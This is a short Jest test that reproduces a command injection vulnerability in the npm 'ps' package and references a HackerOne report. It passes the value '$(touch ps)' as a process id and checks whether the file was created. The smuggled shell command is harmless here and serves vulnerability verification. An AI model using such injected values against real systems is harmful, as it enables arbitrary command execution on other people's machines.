//https://hackerone.com/reports/390848
test("Command Injection in ps", () => {
  const ps = require("ps");
  const fs = require("fs");
  const path = "./ps";
  const sleep = require("sleep");
  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  ps.lookup({ pid: "$(touch ps)" }, function (err, proc) {});
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
